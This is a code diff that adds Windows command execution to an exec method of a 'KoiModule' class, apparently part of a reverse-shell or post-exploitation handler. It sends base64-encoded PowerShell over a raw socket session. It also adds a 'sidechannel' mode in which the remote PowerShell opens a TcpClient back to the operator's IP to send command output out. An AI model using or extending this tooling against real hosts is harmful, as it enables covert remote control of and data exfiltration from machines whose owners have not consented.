@@ -541,6 +541,8 @@ class KoiModule(ABC):
 
     @_owns_io
     def exec(self, command: str, timeout: float = TIMEOUTS["exec_command"], _silent: bool = False):
+        if self.session.os_type and self.session.os_type != "linux":
+            return self._exec_win(command, timeout, _silent)
         marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
         # A PTY echoes the wrapper back, so a line merely *containing* the marker
         # is that echo. Anchor on the numeric exit code to tell them apart.
@@ -572,15 +574,143 @@ class KoiModule(ABC):
             else:
                 output_lines.append(text)
 
-        output = "\n".join(output_lines)
+        return self._build_result(command, returncode, output_lines, started, _silent)
+
+    @_owns_io
+    def _exec_win(self, command: str, timeout: float, _silent: bool):
+        if self.session.upgraded:
+            return self._exec_win_sidechannel(command, timeout, _silent)
+
+        marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
+        done_re = re.compile(rf"{re.escape(marker)}:(-?\d+)")
+
+        rc_expr = "$(if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0})"
+        ps_inner = f"& {{ {command} }}; ''; '{marker}:' + {rc_expr}"
+
+        if self.session.os_type == "windows_ps":
+            cmd = ps_inner
+        else:
+            encoded = base64.b64encode(ps_inner.encode("utf-16-le")).decode("ascii")
+            cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
+
+        eol = self.session.eol
+        enc = self.session.encoding
+        self.session.conn.sendall((cmd + eol).encode(enc))
+
+        started = time.monotonic()
+        buf = b""
+        deadline = time.monotonic() + timeout
+        output_lines: List[str] = []
+        output_bytes = 0
+        truncated = False
+        returncode = 1
+
+        while True:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                raise CommandTimeout(command, timeout)
+            r, _, _ = select.select(
+                [self.session.conn], [], [], min(remaining, _SELECT_TIMEOUT),
+            )
+            if not r:
+                continue
+            chunk = self.session.conn.recv(SOCKET_BUFFER_SIZE)
+            if not chunk:
+                break
+            buf += chunk
+            while b"\n" in buf:
+                raw, buf = buf.split(b"\n", 1)
+                text = raw.decode(enc, errors="replace").strip("\r\n ")
+                text = _PS_PROMPT.sub("", text).strip()
+                if not text:
+                    continue
+                if done_re.search(text) and marker == text[:len(marker)]:
+                    returncode = int(done_re.search(text).group(1))
+                    return self._build_result(
+                        command, returncode, output_lines, started, _silent,
+                    )
+                if marker in text:
+                    output_lines.clear()
+                    output_bytes = 0
+                    truncated = False
+                    continue
+                if truncated:
+                    continue
+                output_bytes += len(text) + 1
+                if output_bytes > _MAX_EXEC_OUTPUT_BYTES:
+                    truncated = True
+                    output_lines.append(
+                        f"[output truncated at {_MAX_EXEC_OUTPUT_BYTES} bytes]",
+                    )
+                else:
+                    output_lines.append(text)
+
+        return self._build_result(command, returncode, output_lines, started, _silent)
+
+    @_owns_io
+    def _exec_win_sidechannel(self, command: str, timeout: float, _silent: bool):
+        marker = f"__KOI_DONE_{uuid.uuid4().hex}__"
+        done_re = re.compile(rf"{re.escape(marker)}:(-?\d+)")
+        local_ip = self._get_local_ip()
+        rc_expr = "if($null-ne $LASTEXITCODE){$LASTEXITCODE}elseif(!$?){1}else{0}"
+
+        with TCPReceiveServer(timeout=timeout) as srv:
+            ps_cmd = (
+                f"$_r=(& {{ {command} }}) 2>&1 | Out-String;"
+                f"$_rc={rc_expr};"
+                f"$_o=$_r.Trim()+\"`n{marker}:$_rc\";"
+                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
+                f"$_s=$_c.GetStream();"
+                f"$_b=[Text.Encoding]::UTF8.GetBytes($_o);"
+                f"$_s.Write($_b,0,$_b.Length);"
+                f"$_s.Flush();$_c.Close()"
+            )
+            started = time.monotonic()
+            self.session.conn.sendall(
+                (ps_cmd + "\r\n").encode(self.session.encoding),
+            )
+            try:
+                raw = srv.collect()
+            except (RuntimeError, TimeoutError):
+                raw = b""
+
+        result_text = raw.decode("utf-8", errors="replace").strip()
+        match = done_re.search(result_text)
+        if match:
+            returncode = int(match.group(1))
+            stdout = result_text[:match.start()].strip()
+        else:
+            returncode = 1
+            stdout = result_text
+
         if self._logger and not _silent:
             self._logger.log_event(f"exec  {command}")
-            if output:
-                self._logger.log_output(output.encode("utf-8", errors="replace"))
+            if stdout:
+                self._logger.log_output(stdout.encode("utf-8", errors="replace"))
         return CommandResult(
             command=command,
             returncode=returncode,
-            stdout=output,
+            stdout=stdout,
+            duration=time.monotonic() - started,
+        )
+
+    def _build_result(
+        self,
+        command: str,
+        returncode: int,
+        output_lines: List[str],
+        started: float,
+        _silent: bool,
+    ) -> CommandResult:
+        stdout = "\n".join(output_lines)
+        if self._logger and not _silent:
+            self._logger.log_event(f"exec  {command}")
+            if stdout:
+                self._logger.log_output(stdout.encode("utf-8", errors="replace"))
+        return CommandResult(
+            command=command,
+            returncode=returncode,
+            stdout=stdout,
             duration=time.monotonic() - started,
         )
 
